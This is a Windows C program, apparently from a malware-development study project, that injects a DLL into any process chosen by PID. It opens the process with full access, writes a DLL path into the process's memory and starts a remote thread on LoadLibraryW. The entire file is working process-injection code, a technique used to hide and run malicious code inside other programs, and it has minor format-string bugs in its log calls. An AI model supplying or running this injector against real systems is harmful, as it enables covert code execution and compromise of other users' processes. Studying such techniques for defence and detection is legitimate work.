#include <stdio.h>
#include <windows.h>
#include "defenitions.h"

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\AvaLi\\Documents\\programming\\Maldev\\Winjection-NativeAPI\\Winjection-NativeAPI\\DLLInjection\\build\\ALB.dll";
size_t dllPathSize = sizeof(dllPath);

int main(int argc, char* argv[]) {
  if (argc <2 ) {
    warn("Incorrect Usage.\n%s [PID]\n\t\\___Process ID to Inject to.", argv[0]);
    return EXIT_FAILURE;
  }

  PID = atoi(argv[1]);
  info("Trying to get a handle to the process (%ld)", PID);

  hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
  if (hProcess == NULL) {
    warn("Failed to get a handle to the process\nError: %ld", GetLastError());
    return EXIT_FAILURE;
  }

  okay("Got a handle to the process \\---0x%p\n\t\\___(%ld)", hProcess, PID);

  rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

  if (rBuffer == NULL) {
    warn("Couldn't allocate to process memory\nError: %ld", GetLastError());
    return EXIT_FAILURE;
  }

  okay("Allocated buffer to process memory with PAGE_READWRITE permissions.");

  WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);
  okay("Wrote [%s] to process memory", dllPath);

  hKernel32 = GetModuleHandleW(L"Kernel32");
  if (hKernel32 == NULL) {
    warn("Failed to get handle to Kernel32.dll\nError: %ld", GetLastError());
    CloseHandle(hProcess);
    return EXIT_FAILURE;
  }

  okay("Got a handle to Kernel32.dll\n\\___[ Kernel32.dll\n\t\\_0x%p]\n", hKernel32);
  LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");

  if (startThis == NULL) {
    warn("Failed to get the address to LoadLibraryW\nError: %ld", GetLastError());
    CloseHandle(hProcess);
    return EXIT_FAILURE;
  }

  okay("Got the address to LoadLibraryW\n\\___[ LoadLibraryW\n\t\\_0x%p]\n", startThis);

  hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);

  if (hThread == NULL) {
    warn("Failed to get a handle to thread, error: %ld", GetLastError());
    CloseHandle(hProcess);
    return EXIT_FAILURE;
  }

  okay("%s Got a handle to the newly-created thread\n\\___[ hThread\n\t\\_0x%p]\n", hThread);
  info("Waiting for the thread to finish execution...");

  WaitForSingleObject(hThread, INFINITE);
  okay("Thread finished, beginning cleanup.");

  CloseHandle(hThread);
  CloseHandle(hProcess);

  printf("Finished! Happy hacking!");
  return EXIT_SUCCESS;
}